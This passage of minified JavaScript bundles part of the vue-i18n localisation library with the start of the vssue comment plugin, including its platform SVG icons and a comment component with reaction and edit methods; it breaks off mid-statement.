>0;)n[r]=arguments[r+1];return(t=this)._t.apply(t,[e,this.locale,this._getMessages(),null].concat(n))},Dr.prototype._i=function(e,t,n,r,a){var o=this._translate(n,t,this.fallbackLocale,e,r,"raw",a);if(this._isFallbackRoot(o)){if(!this._root)throw Error("unexpected error");return this._root.$i18n.i(e,t,a)}return this._warnDefault(t,e,o,r,[a],"raw")},Dr.prototype.i=function(e,t,n){return e?(Kn(t)||(t=this.locale),this._i(e,t,this._getMessages(),null,n)):""},Dr.prototype._tc=function(e,t,n,r,a){for(var o,i=[],s=arguments.length-5;s-- >0;)i[s]=arguments[s+5];if(!e)return"";void 0===a&&(a=1);var l={count:a,n:a},c=Xn.apply(void 0,i);return c.params=Object.assign(l,c.params),i=null===c.locale?[c.params]:[c.locale,c.params],this.fetchChoice((o=this)._t.apply(o,[e,t,n,r].concat(i)),a)},Dr.prototype.fetchChoice=function(e,t){if(!e||!Kn(e))return null;var n=e.split("|");return n[t=this.getChoiceIndex(t,n.length)]?n[t].trim():e},Dr.prototype.tc=function(e,t){for(var n,r=[],a=arguments.length-2;a-- >0;)r[a]=arguments[a+2];return(n=this)._tc.apply(n,[e,this.locale,this._getMessages(),null,t].concat(r))},Dr.prototype._te=function(e,t,n){for(var r=[],a=arguments.length-3;a-- >0;)r[a]=arguments[a+3];var o=Xn.apply(void 0,r).locale||t;return this._exist(n[o],e)},Dr.prototype.te=function(e,t){return this._te(e,this.locale,this._getMessages(),t)},Dr.prototype.getLocaleMessage=function(e){return er(this._vm.messages[e]||{})},Dr.prototype.setLocaleMessage=function(e,t){"warn"!==this._warnHtmlInMessage&&"error"!==this._warnHtmlInMessage||this._checkLocaleMessage(e,this._warnHtmlInMessage,t),this._vm.$set(this._vm.messages,e,t)},Dr.prototype.mergeLocaleMessage=function(e,t){"warn"!==this._warnHtmlInMessage&&"error"!==this._warnHtmlInMessage||this._checkLocaleMessage(e,this._warnHtmlInMessage,t),this._vm.$set(this._vm.messages,e,ar(void 0!==this._vm.messages[e]&&Object.keys(this._vm.messages[e]).length?this._vm.messages[e]:{},t))},Dr.prototype.getDateTimeFormat=function(e){return er(this._vm.dateTimeFormats[e]||{})},Dr.prototype.setDateTimeFormat=function(e,t){this._vm.$set(this._vm.dateTimeFormats,e,t),this._clearDateTimeFormat(e,t)},Dr.prototype.mergeDateTimeFormat=function(e,t){this._vm.$set(this._vm.dateTimeFormats,e,ar(this._vm.dateTimeFormats[e]||{},t)),this._clearDateTimeFormat(e,t)},Dr.prototype._clearDateTimeFormat=function(e,t){for(var n in t){var r=e+"__"+n;this._dateTimeFormatters.hasOwnProperty(r)&&delete this._dateTimeFormatters[r]}},Dr.prototype._localizeDateTime=function(e,t,n,r,a){for(var o=t,i=r[o],s=this._getLocaleChain(t,n),l=0;l<s.length;l++){var c=s[l];if(o=c,!Zn(i=r[c])&&!Zn(i[a]))break}if(Zn(i)||Zn(i[a]))return null;var u=i[a],p=o+"__"+a,d=this._dateTimeFormatters[p];return d||(d=this._dateTimeFormatters[p]=new Intl.DateTimeFormat(o,u)),d.format(e)},Dr.prototype._d=function(e,t,n){if(!n)return new Intl.DateTimeFormat(t).format(e);var r=this._localizeDateTime(e,t,this.fallbackLocale,this._getDateTimeFormats(),n);if(this._isFallbackRoot(r)){if(!this._root)throw Error("unexpected error");return this._root.$i18n.d(e,n,t)}return r||""},Dr.prototype.d=function(e){for(var t=[],n=arguments.length-1;n-- >0;)t[n]=arguments[n+1];var r=this.locale,a=null;return 1===t.length?Kn(t[0])?a=t[0]:Wn(t[0])&&(t[0].locale&&(r=t[0].locale),t[0].key&&(a=t[0].key)):2===t.length&&(Kn(t[0])&&(a=t[0]),Kn(t[1])&&(r=t[1])),this._d(e,r,a)},Dr.prototype.getNumberFormat=function(e){return er(this._vm.numberFormats[e]||{})},Dr.prototype.setNumberFormat=function(e,t){this._vm.$set(this._vm.numberFormats,e,t),this._clearNumberFormat(e,t)},Dr.prototype.mergeNumberFormat=function(e,t){this._vm.$set(this._vm.numberFormats,e,ar(this._vm.numberFormats[e]||{},t)),this._clearNumberFormat(e,t)},Dr.prototype._clearNumberFormat=function(e,t){for(var n in t){var r=e+"__"+n;this._numberFormatters.hasOwnProperty(r)&&delete this._numberFormatters[r]}},Dr.prototype._getNumberFormatter=function(e,t,n,r,a,o){for(var i=t,s=r[i],l=this._getLocaleChain(t,n),c=0;c<l.length;c++){var u=l[c];if(i=u,!Zn(s=r[u])&&!Zn(s[a]))break}if(Zn(s)||Zn(s[a]))return null;var p,d=s[a];if(o)p=new Intl.NumberFormat(i,Object.assign({},d,o));else{var g=i+"__"+a;(p=this._numberFormatters[g])||(p=this._numberFormatters[g]=new Intl.NumberFormat(i,d))}return p},Dr.prototype._n=function(e,t,n,r){if(!Dr.availabilities.numberFormat)return"";if(!n)return(r?new Intl.NumberFormat(t,r):new Intl.NumberFormat(t)).format(e);var a=this._getNumberFormatter(e,t,this.fallbackLocale,this._getNumberFormats(),n,r),o=a&&a.format(e);if(this._isFallbackRoot(o)){if(!this._root)throw Error("unexpected error");return this._root.$i18n.n(e,Object.assign({},{key:n,locale:t},r))}return o||""},Dr.prototype.n=function(e){for(var t=[],n=arguments.length-1;n-- >0;)t[n]=arguments[n+1];var r=this.locale,a=null,o=null;return 1===t.length?Kn(t[0])?a=t[0]:Wn(t[0])&&(t[0].locale&&(r=t[0].locale),t[0].key&&(a=t[0].key),o=Object.keys(t[0]).reduce((function(e,n){var r;return tr(zn,n)?Object.assign({},e,((r={})[n]=t[0][n],r)):e}),null)):2===t.length&&(Kn(t[0])&&(a=t[0]),Kn(t[1])&&(r=t[1])),this._n(e,r,a,o)},Dr.prototype._ntp=function(e,t,n,r){if(!Dr.availabilities.numberFormat)return[];if(!n)return(r?new Intl.NumberFormat(t,r):new Intl.NumberFormat(t)).formatToParts(e);var a=this._getNumberFormatter(e,t,this.fallbackLocale,this._getNumberFormats(),n,r),o=a&&a.formatToParts(e);if(this._isFallbackRoot(o)){if(!this._root)throw Error("unexpected error");return this._root.$i18n._ntp(e,t,n,r)}return o||[]},Object.defineProperties(Dr.prototype,Nr),Object.defineProperty(Dr,"availabilities",{get:function(){if(!Er){var e="undefined"!=typeof Intl;Er={dateTimeFormat:e&&void 0!==Intl.DateTimeFormat,numberFormat:e&&void 0!==Intl.NumberFormat}}return Er}}),Dr.install=xr,Dr.version="8.22.4";var $r=Dr;
/*!
 * vssue - A vue-powered issue-based comment plugin
 *
 * @version v1.4.7
 * @link https://vssue.js.org
 * @license MIT
 * @copyright 2018-2021 meteorlxy
 */
/*! *****************************************************************************
Copyright (c) Microsoft Corporation. All rights reserved.
Licensed under the Apache License, Version 2.0 (the "License"); you may not use
this file except in compliance with the License. You may obtain a copy of the
License at http://www.apache.org/licenses/LICENSE-2.0

THIS CODE IS PROVIDED ON AN *AS IS* BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
KIND, EITHER EXPRESS OR IMPLIED, INCLUDING WITHOUT LIMITATION ANY IMPLIED
WARRANTIES OR CONDITIONS OF TITLE, FITNESS FOR A PARTICULAR PURPOSE,
MERCHANTABLITY OR NON-INFRINGEMENT.

See the Apache Version 2.0 License for specific language governing permissions
and limitations under the License.
***************************************************************************** */function Fr(e,t,n,r){var a,o=arguments.length,i=o<3?t:null===r?r=Object.getOwnPropertyDescriptor(t,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)i=Reflect.decorate(e,t,n,r);else for(var s=e.length-1;s>=0;s--)(a=e[s])&&(i=(o<3?a(i):o>3?a(t,n,i):a(t,n))||i);return o>3&&i&&Object.defineProperty(t,n,i),i}var Ur=o.default.extend({name:"Iconfont"});function Br(e,t,n,r,a,o,i,s,l,c){"boolean"!=typeof i&&(l=s,s=i,i=!1);const u="function"==typeof n?n.options:n;let p;if(e&&e.render&&(u.render=e.render,u.staticRenderFns=e.staticRenderFns,u._compiled=!0,a&&(u.functional=!0)),r&&(u._scopeId=r),o?(p=function(e){(e=e||this.$vnode&&this.$vnode.ssrContext||this.parent&&this.parent.$vnode&&this.parent.$vnode.ssrContext)||"undefined"==typeof __VUE_SSR_CONTEXT__||(e=__VUE_SSR_CONTEXT__),t&&t.call(this,l(e)),e&&e._registeredComponents&&e._registeredComponents.add(o)},u._ssrRegister=p):t&&(p=i?function(e){t.call(this,c(e,this.$root.$options.shadowRoot))}:function(e){t.call(this,s(e))}),p)if(u.functional){const e=u.render;u.render=function(t,n){return p.call(n),e(t,n)}}else{const e=u.beforeCreate;u.beforeCreate=e?[].concat(e,p):[p]}return n}"undefined"!=typeof navigator&&/msie [6-9]\\b/.test(navigator.userAgent.toLowerCase());const Hr=Br({render:function(e,t){var n=t._c;return n("svg",{directives:[{name:"show",rawName:"v-show",value:!1,expression:"false"}]},[n("symbol",{attrs:{id:"vssue-icon-bitbucket",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M579.5522464 489.45249493q4.8371808 38.38537173-30.81752427 61.55702827t-67.95459093 3.66689493q-23.79580907-10.37653333-32.6119616-35.34262826t-0.31207573-50.01020907 31.67573333-35.34262827q21.92335253-11.00068587 44.1587808-7.33379093t39.00952427 21.61127573 16.77409493 41.1160384zM647.19476053 476.65737173q-8.50407573-65.22392427-68.8908192-99.9424t-120.07131413-7.9579424q-38.38537173 17.08617173-61.24495253 53.9111616t-21.0651424 78.95527574q2.41859093 55.4715424 47.20152426 94.48106666t100.87862827 34.1723424q55.4715424-4.8371808 92.60860907-51.18049493t30.50544746-102.43900907zM792.93434133 146.32472427q-12.17097173-16.4620192-34.1723424-27.15062827t-35.34262826-13.41927573-43.30057174-7.64586667q-177.33729493-28.63299093-345.00022826 1.24830507-26.2144 4.29104747-40.25782827 7.33379093t-33.54819093 13.41927573-30.50544747 26.2144q18.2564576 17.08617173 46.34331413 27.6967616t44.78293334 13.41927574 53.36502826 7.02171413q138.95192427 17.71032427 273.06666667 0.62415253 38.38537173-4.8371808 54.53531413-7.33379093t44.1587808-13.1072 45.7191616-28.32091413zM827.65281813 777.10872427q-4.8371808 15.83786667-9.44030506 46.65539093t-8.50407574 51.18049493-17.39824746 42.6764192-35.34262827 34.4064q-52.4288 29.2571424-115.46819093 43.61264747t-123.1140576 13.41927573-122.8019808-11.3127616q-28.0088384-4.8371808-49.69813334-11.00068586t-46.65539093-16.4620192-44.4708576-26.52647574-31.67573333-37.4491424q-15.21371413-58.51428587-34.71847574-177.96144746l3.66689494-9.7523808 11.00068586-5.46133334q135.9091808 90.1900192 308.72137174 90.1900192t309.34552426-90.1900192q12.79512427 3.66689493 14.5895616 14.04342827t-3.0427424 27.46270507-4.8371808 22.54750506zM937.97175147 191.41973333q-15.83786667 101.8148576-67.64251414 399.22346667-3.0427424 18.2564576-16.4620192 34.1723424t-26.52647573 24.3419424-33.23611413 18.88060907q-153.61950507 76.7707424-371.8387808 53.67710506-151.12289493-16.4620192-240.14262827-84.72868586-9.12822827-7.33379093-15.52579093-16.1499424t-10.37653334-21.2992-5.46133333-20.75306667-3.66689493-24.10788587-3.3548192-21.2992q-5.46133333-30.50544747-16.1499424-91.43832426t-17.08617174-98.4600384-14.35550506-89.8779424-13.41927574-96.27550507q1.7944384-15.83786667 10.68860907-29.5692192t19.19268587-22.8595808 27.46270506-18.2564576 28.0088384-13.73135253 29.2571424-11.3127616q76.22460907-28.0088384 190.75657174-39.00952427 231.0144-22.54750507 412.01859093 30.50544747 94.48106667 28.0088384 131.072 74.35215253 9.7523808 12.17097173 10.0644576 31.0515808t-3.3548192 32.9240384z"}})]),t._v(" "),n("symbol",{attrs:{id:"vssue-icon-gitea",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M184.31868985 236.10860742C106.94832667 235.94086648 3.32655508 285.13080468 9.02973665 408.46209936c8.93218827 192.65010787 206.32096845 210.5144844 285.20099725 212.06608453 8.63864186 36.14810496 101.48307766 160.77938883 170.21479898 167.32127321h301.09442177c180.57278288-11.99345499 315.77172611-546.07960359 215.54670217-548.09249109-165.7696721 7.79993906-264.02374305 11.74184405-348.27147151 12.41280591v166.69224585l-26.25140843-11.61603761-0.16773997-154.99233728c-96.70246985-0.04193548-181.83083757-4.52899687-343.4069947-12.49667687-20.21274496-0.12580547-48.39316992-3.5644886-78.67035236-3.64835859z m10.94507577 68.14462849h9.22573371c10.98701124 98.75729283 28.85138778 156.50200291 64.99949274 244.73357185-92.25734394-10.90314029-170.75995634-37.69970509-185.18564974-137.75698809-7.46445813-51.78991757 17.69663558-105.84433456 110.96042329-107.01851827z m358.83913087 97.07988723c6.29027343 0.08386999 12.70635233 1.25805468 18.74501482 4.02577499l31.40943263 13.54505513-22.51917887 41.05451824a28.18042496 25.03528825 0 0 0-10.10637297 1.59353561 28.18042496 25.03528825 0 0 0-16.98373825 32.038459 28.18042496 25.03528825 0 0 0 4.69673781 7.29671718l-38.83195528 70.70267333a28.18042496 25.03528825 0 0 0-9.30960467 1.59353659 28.18042496 25.03528825 0 0 0-16.98373825 32.038459 28.18042496 25.03528825 0 0 0 36.06423497 15.09665623 28.18042496 25.03528825 0 0 0 16.94180276-32.08039449 28.18042496 25.03528825 0 0 0-6.62575434-9.22573468l37.82551056-68.85752581a28.18042496 25.03528825 0 0 0 12.28700044-1.25805469 28.18042496 25.03528825 0 0 0 8.93218826-4.69673783c14.59343435 6.12253248 26.54495386 11.11281671 35.14166122 15.34826717 12.91602778 6.37414341 17.48696012 10.60959485 18.87082027 15.30633169 1.38386015 4.61286685-0.12580547 13.50312062-7.42252263 29.10299872-5.45157063 11.61603859-14.46762889 28.09655497-25.11915823 47.51253164a28.18042496 25.03528825 0 0 0-10.52572486 1.59353659 28.18042496 25.03528825 0 0 0-16.98373826 32.038459 28.18042496 25.03528825 0 0 0 36.06423498 15.09665623 28.18042496 25.03528825 0 0 0 16.94180278-32.03845901 28.18042496 25.03528825 0 0 0-5.74511608-8.47090188c10.52572388-19.20630122 19.58371762-35.72875308 25.41270465-48.14155897 7.88380904-16.85793279 11.99345499-29.39654416 8.38703091-41.51580463-3.60642311-12.11926046-14.67730434-20.0030695-29.35460966-27.25785217-9.6450856-4.73867233-21.68047607-9.77089106-36.06423399-15.80955357a28.18042496 25.03528825 0 0 0-1.59353562-10.022502 28.18042496 25.03528825 0 0 0-6.08059796-8.7644483l22.14176246-40.38355541 122.61839638 52.96410227c22.14176247 9.6031511 31.2836262 33.12877372 20.54822685 52.8382968l-84.28966393 154.32137544c-10.77733482 19.66758857-37.23841869 27.80300855-59.38018118 18.24179293l-173.48574115-74.98005927c-22.14176247-9.5612156-31.32556167-33.12877372-20.54822687-52.83829679l84.28966395-154.27943995c7.38058716-13.54505513 22.22563246-21.59660511 37.951317-22.22563246h2.68384935z"}})]),t._v(" "),n("symbol",{attrs:{id:"vssue-icon-gitee",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M978.404275 409.561604H455.061338c-25.117645 0-45.499734 20.382089-45.499734 45.499734l-0.031997 113.781333c0 25.117645 20.350092 45.499734 45.499734 45.531731h318.594132c25.117645 0 45.499734 20.382089 45.499734 45.499735v22.749867a136.5312 136.5312 0 0 1-136.5312 136.5312H250.248539a45.499734 45.499734 0 0 1-45.499734-45.499734V341.343999a136.5312 136.5312 0 0 1 136.5312-136.5312L978.308284 204.780802c25.117645 0 45.499734-20.350092 45.499734-45.467738L1023.904009 45.531731h0.031997A45.499734 45.499734 0 0 0 978.468269 0h-0.031997L341.343999 0.031997C152.84967 0.031997 0.031997 152.84967 0.031997 341.343999v637.092273c0 25.117645 20.382089 45.499734 45.499734 45.499734h671.233072a307.171203 307.171203 0 0 0 307.171203-307.171203v-261.671468c0-25.117645-20.382089-45.499734-45.499734-45.499734z"}})]),t._v(" "),n("symbol",{attrs:{id:"vssue-icon-github",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M512 20.4425c-278.334 0-504 225.6345-504 504 0 222.6735 144.4275 411.6105 344.673 478.233 25.2 4.662 34.461-10.9305 34.461-24.255 0-12.0015-0.4725-51.723-0.693-93.8385-140.238 30.492-169.8165-59.472-169.8165-59.472-22.932-58.2435-55.944-73.7415-55.944-73.7415-45.738-31.2795 3.465-30.6495 3.465-30.6495 50.589 3.5595 77.238 51.9435 77.238 51.9435 44.9505 77.049 117.9045 54.7785 146.664 41.895 4.5045-32.571 17.577-54.81 32.004-67.41-111.951-12.726-229.635-55.9755-229.635-249.0705 0-55.0305 19.6875-99.981 51.9435-135.2925-5.229-12.6945-22.491-63.945 4.8825-133.371 0 0 42.336-13.545 138.6315 51.66 40.194-11.1825 83.3175-16.758 126.1575-16.9785 42.8085 0.189 85.9635 5.796 126.252 16.9785 96.201-65.205 138.4425-51.66 138.4425-51.66 27.4365 69.426 10.1745 120.6765 4.9455 133.371 32.319 35.28 51.8805 80.262 51.8805 135.2925 0 193.5675-117.9045 236.187-230.139 248.6925 18.081 15.6555 34.1775 46.305 34.1775 93.3345 0 67.4415-0.5985 121.716-0.5985 138.3165 0 13.419 9.072 29.1375 34.6185 24.192 200.151-66.717 344.3895-255.5595 344.3895-478.17 0-278.3655-225.666-504-504-504z"}})]),t._v(" "),n("symbol",{attrs:{id:"vssue-icon-gitlab",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M66.61375986 405.11600042L512.11376028 976.03999972 23.84576 621.65599958a39.312 39.312 0 0 1-14.07600042-43.30799944l56.8080007-173.26800028z m259.88400014 0h371.26800014L512.14975986 976.03999972zM215.11376 60.88400042l111.384 344.232H66.61375986l111.384-344.232a19.72800014 19.72800014 0 0 1 37.11600014 0z m742.49999972 344.232l56.8080007 173.2679993a39.23999986 39.23999986 0 0 1-14.07600042 43.30800042l-488.26800028 354.38400014 445.50000042-570.92400028z m0 0h-259.88400014l111.384-344.232a19.72800014 19.72800014 0 0 1 37.11600014 0z"}})]),t._v(" "),n("symbol",{attrs:{id:"vssue-icon-loading",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M843.307 742.24c0 3.217 2.607 5.824 5.824 5.824s5.824-2.607 5.824-5.824a5.823 5.823 0 0 0-5.824-5.824 5.823 5.823 0 0 0-5.824 5.824zM714.731 874.912c0 6.398 5.186 11.584 11.584 11.584s11.584-5.186 11.584-11.584-5.186-11.584-11.584-11.584-11.584 5.186-11.584 11.584zM541.419 943.2c0 9.614 7.794 17.408 17.408 17.408s17.408-7.794 17.408-17.408-7.794-17.408-17.408-17.408-17.408 7.794-17.408 17.408z m-186.56-9.152c0 12.795 10.373 23.168 23.168 23.168s23.168-10.373 23.168-23.168-10.373-23.168-23.168-23.168-23.168 10.373-23.168 23.168zM189.355 849.12c0 16.012 12.98 28.992 28.992 28.992s28.992-12.98 28.992-28.992-12.98-28.992-28.992-28.992-28.992 12.98-28.992 28.992zM74.731 704.736c0 19.228 15.588 34.816 34.816 34.816s34.816-15.588 34.816-34.816-15.588-34.816-34.816-34.816-34.816 15.588-34.816 34.816z m-43.008-177.28c0 22.41 18.166 40.576 40.576 40.576s40.576-18.166 40.576-40.576-18.166-40.576-40.576-40.576-40.576 18.166-40.576 40.576z m35.392-176.128c0 25.626 20.774 46.4 46.4 46.4s46.4-20.774 46.4-46.4c0-25.626-20.774-46.4-46.4-46.4-25.626 0-46.4 20.774-46.4 46.4z m106.176-142.016c0 28.843 23.381 52.224 52.224 52.224s52.224-23.381 52.224-52.224c0-28.843-23.381-52.224-52.224-52.224-28.843 0-52.224 23.381-52.224 52.224z m155.904-81.344c0 32.024 25.96 57.984 57.984 57.984s57.984-25.96 57.984-57.984-25.96-57.984-57.984-57.984-57.984 25.96-57.984 57.984z m175.104-5.056c0 35.24 28.568 63.808 63.808 63.808s63.808-28.568 63.808-63.808c0-35.24-28.568-63.808-63.808-63.808-35.24 0-63.808 28.568-63.808 63.808z m160.32 72.128c0 38.421 31.147 69.568 69.568 69.568s69.568-31.147 69.568-69.568-31.147-69.568-69.568-69.568-69.568 31.147-69.568 69.568z m113.92 135.488c0 41.638 33.754 75.392 75.392 75.392s75.392-33.754 75.392-75.392-33.754-75.392-75.392-75.392-75.392 33.754-75.392 75.392z m45.312 175.488c0 44.854 36.362 81.216 81.216 81.216s81.216-36.362 81.216-81.216c0-44.854-36.362-81.216-81.216-81.216-44.854 0-81.216 36.362-81.216 81.216z"}})]),t._v(" "),n("symbol",{attrs:{id:"vssue-icon-like",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M885.9 533.7c16.8-22.2 26.1-49.4 26.1-77.7 0-44.9-25.1-87.4-65.5-111.1a67.67 67.67 0 0 0-34.3-9.3H572.4l6-122.9c1.4-29.7-9.1-57.9-29.5-79.4-20.5-21.5-48.1-33.4-77.9-33.4-52 0-98 35-111.8 85.1l-85.9 311H144c-17.7 0-32 14.3-32 32v364c0 17.7 14.3 32 32 32h601.3c9.2 0 18.2-1.8 26.5-5.4 47.6-20.3 78.3-66.8 78.3-118.4 0-12.6-1.8-25-5.4-37 16.8-22.2 26.1-49.4 26.1-77.7 0-12.6-1.8-25-5.4-37 16.8-22.2 26.1-49.4 26.1-77.7-0.2-12.6-2-25.1-5.6-37.1zM184 852V568h81v284h-81z m636.4-353l-21.9 19 13.9 25.4c4.6 8.4 6.9 17.6 6.9 27.3 0 16.5-7.2 32.2-19.6 43l-21.9 19 13.9 25.4c4.6 8.4 6.9 17.6 6.9 27.3 0 16.5-7.2 32.2-19.6 43l-21.9 19 13.9 25.4c4.6 8.4 6.9 17.6 6.9 27.3 0 22.4-13.2 42.6-33.6 51.8H329V564.8l99.5-360.5c5.2-18.9 22.5-32.2 42.2-32.3 7.6 0 15.1 2.2 21.1 6.7 9.9 7.4 15.2 18.6 14.6 30.5l-9.6 198.4h314.4C829 418.5 840 436.9 840 456c0 16.5-7.2 32.1-19.6 43z"}})]),t._v(" "),n("symbol",{attrs:{id:"vssue-icon-unlike",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M885.9 490.3c3.6-12 5.4-24.4 5.4-37 0-28.3-9.3-55.5-26.1-77.7 3.6-12 5.4-24.4 5.4-37 0-28.3-9.3-55.5-26.1-77.7 3.6-12 5.4-24.4 5.4-37 0-51.6-30.7-98.1-78.3-118.4-8.3-3.6-17.2-5.4-26.5-5.4H144c-17.7 0-32 14.3-32 32v364c0 17.7 14.3 32 32 32h129.3l85.8 310.8C372.9 889 418.9 924 470.9 924c29.7 0 57.4-11.8 77.9-33.4 20.5-21.5 31-49.7 29.5-79.4l-6-122.9h239.9c12.1 0 23.9-3.2 34.3-9.3 40.4-23.5 65.5-66.1 65.5-111 0-28.3-9.3-55.5-26.1-77.7zM184 456V172h81v284h-81z m627.2 160.4H496.8l9.6 198.4c0.6 11.9-4.7 23.1-14.6 30.5-6.1 4.5-13.6 6.8-21.1 6.7-19.6-0.1-36.9-13.4-42.2-32.3L329 459.2V172h415.4c20.4 9.2 33.6 29.4 33.6 51.8 0 9.7-2.3 18.9-6.9 27.3l-13.9 25.4 21.9 19c12.5 10.8 19.6 26.5 19.6 43 0 9.7-2.3 18.9-6.9 27.3l-13.9 25.4 21.9 19c12.5 10.8 19.6 26.5 19.6 43 0 9.7-2.3 18.9-6.9 27.3l-14 25.5 21.9 19c12.5 10.8 19.6 26.5 19.6 43 0 19.1-11 37.5-28.8 48.4z"}})]),t._v(" "),n("symbol",{attrs:{id:"vssue-icon-heart",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M923 283.6c-13.4-31.1-32.6-58.9-56.9-82.8-24.3-23.8-52.5-42.4-84-55.5-32.5-13.5-66.9-20.3-102.4-20.3-49.3 0-97.4 13.5-139.2 39-10 6.1-19.5 12.8-28.5 20.1-9-7.3-18.5-14-28.5-20.1-41.8-25.5-89.9-39-139.2-39-35.5 0-69.9 6.8-102.4 20.3-31.4 13-59.7 31.7-84 55.5-24.4 23.9-43.5 51.7-56.9 82.8-13.9 32.3-21 66.6-21 101.9 0 33.3 6.8 68 20.3 103.3 11.3 29.5 27.5 60.1 48.2 91 32.8 48.9 77.9 99.9 133.9 151.6 92.8 85.7 184.7 144.9 188.6 147.3l23.7 15.2c10.5 6.7 24 6.7 34.5 0l23.7-15.2c3.9-2.5 95.7-61.6 188.6-147.3 56-51.7 101.1-102.7 133.9-151.6 20.7-30.9 37-61.5 48.2-91 13.5-35.3 20.3-70 20.3-103.3 0.1-35.3-7-69.6-20.9-101.9zM512 814.8S156 586.7 156 385.5C156 283.6 240.3 201 344.3 201c73.1 0 136.5 40.8 167.7 100.4C543.2 241.8 606.6 201 679.7 201c104 0 188.3 82.6 188.3 184.5 0 201.2-356 429.3-356 429.3z"}})]),t._v(" "),n("symbol",{attrs:{id:"vssue-icon-edit",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M723.2 917.76H286.72c-65.28 0-118.4-51.2-118.4-113.92V261.76C168.32 198.4 221.44 147.2 286.72 147.2h375.04c17.92 0 32 14.08 32 32s-14.08 32-32 32H286.72c-30.08 0-54.4 22.4-54.4 49.92v542.08c0 27.52 24.32 49.92 54.4 49.92H723.2c30.08 0 54.4-22.4 54.4-49.92V440.32c0-17.92 14.08-32 32-32s32 14.08 32 32v363.52c0 62.72-53.12 113.92-118.4 113.92z"}}),t._v(" "),n("path",{attrs:{d:"M499.84 602.24c-7.68 0-14.72-2.56-21.12-7.68-13.44-11.52-14.72-32-3.2-45.44L780.16 198.4c11.52-13.44 32-14.72 45.44-3.2s14.72 32 3.2 45.44L524.16 591.36c-6.4 7.04-15.36 10.88-24.32 10.88z"}})]),t._v(" "),n("symbol",{attrs:{id:"vssue-icon-delete",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M677.647059 256l0-90.352941c0-37.436235-23.461647-60.235294-61.771294-60.235294L408.094118 105.411765c-38.249412 0-61.741176 22.799059-61.741176 60.235294l0 90.352941-180.705882 0 0 60.235294 60.235294 0 0 512c0 54.272 33.972706 90.352941 90.352941 90.352941l391.529412 0c55.085176 0 90.352941-33.490824 90.352941-90.352941l0-512 60.235294 0 0-60.235294L677.647059 256zM406.588235 165.647059l210.823529 0-1.264941 90.352941L406.588235 256 406.588235 165.647059zM737.882353 858.352941l-451.764706 0 0-542.117647 451.764706 0L737.882353 858.352941zM466.823529 376.470588l-58.729412 0-1.505882 391.529412 60.235294 0L466.823529 376.470588zM617.411765 376.470588l-60.235294 0 0 391.529412 60.235294 0L617.411765 376.470588z"}})]),t._v(" "),n("symbol",{attrs:{id:"vssue-icon-reply",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M426.666667 384 426.666667 213.333333 128 512 426.666667 810.666667 426.666667 635.733333C640 635.733333 789.333333 704 896 853.333333 853.333333 640 725.333333 426.666667 426.666667 384Z"}})]),t._v(" "),n("symbol",{attrs:{id:"vssue-icon-error",viewBox:"0 0 1024 1024"}},[n("path",{attrs:{d:"M512 720m-48 0a48 48 0 1 0 96 0 48 48 0 1 0-96 0Z"}}),t._v(" "),n("path",{attrs:{d:"M480 416v184c0 4.4 3.6 8 8 8h48c4.4 0 8-3.6 8-8V416c0-4.4-3.6-8-8-8h-48c-4.4 0-8 3.6-8 8z"}}),t._v(" "),n("path",{attrs:{d:"M955.7 856l-416-720c-6.2-10.7-16.9-16-27.7-16s-21.6 5.3-27.7 16l-416 720C56 877.4 71.4 904 96 904h832c24.6 0 40-26.6 27.7-48z m-783.5-27.9L512 239.9l339.8 588.2H172.2z"}})])])},staticRenderFns:[]},void 0,Ur,void 0,!0,void 0,!1,void 0,void 0,void 0);const qr=Br({},void 0,o.default.extend({name:"TransitionFade",functional:!0,props:{group:{type:Boolean,required:!1,default:!1},tag:{type:String,required:!1,default:"div"}},render:(e,{props:t,children:n})=>e(t.group?"TransitionGroup":"Transition",{props:{name:"fade",mode:"out-in",appear:!0,tag:t.tag}},n)}),void 0,void 0,void 0,!1,void 0,void 0,void 0);const zr=Br({},void 0,o.default.extend({name:"VssueIcon",functional:!0,props:{name:{type:String,required:!0},title:{type:String,required:!1,default:null}},render:(e,{props:t,data:n})=>e("svg",Object.assign(Object.assign({},n),{class:["vssue-icon","vssue-icon-"+t.name],attrs:{"aria-hidden":"true"}}),[e("title",t.title),e("use",{attrs:{"xlink:href":"#vssue-icon-"+t.name}})])}),void 0,void 0,void 0,!1,void 0,void 0,void 0);let Jr=class extends o.default{constructor(){super(...arguments),this.editMode=!1,this.editContent=this.comment.contentRaw,this.creatingReactions=[],this.isPutingComment=!1,this.isDeletingComment=!1}get currentUser(){return this.vssue.user?this.vssue.user.username:null}get content(){return this.comment.content}get author(){return this.comment.author}get createdAt(){return Bn(this.comment.createdAt)}get updatedAt(){return Bn(this.comment.updatedAt)}get showReactions(){return Boolean(this.vssue.API&&this.vssue.API.platform.meta.reactable&&this.comment.reactions&&!this.editMode)}get reactionKeys(){return["heart","like","unlike"]}get editContentRows(){return this.editContent.split("\n").length-1}get editInputRows(){return this.editContentRows<3?5:this.editContentRows+2}async postReaction({reaction:e}){try{if(this.creatingReactions.includes(e))return;this.creatingReactions.push(e);await this.vssue.postCommentReaction({commentId:this.comment.id,reaction:e})||this.vssue.$emit("error",new Error(this.vssue.$t("reactionGiven",{reaction:this.vssue.$t(e)})));const t=await this.vssue.getCommentReactions({commentId:this.comment.id});t&&(this.comment.reactions=t)}finally{this.creatingReactions.splice(this.creatingReactions.findIndex(t=>t===e),1)}}enterEdit(){this.editMode=!0,this.$nextTick(()=>{this.$refs.input.focus()})}resetEdit(){this.editMode=!1,this.editContent=this.comment.contentRaw}async putComment(){try{if(this.vssue.isPending)return;if(this.editContent!==this.comment.contentRaw){this.isPutingComment=!0,this.vssue.isUpdatingComment=!0;const e=await 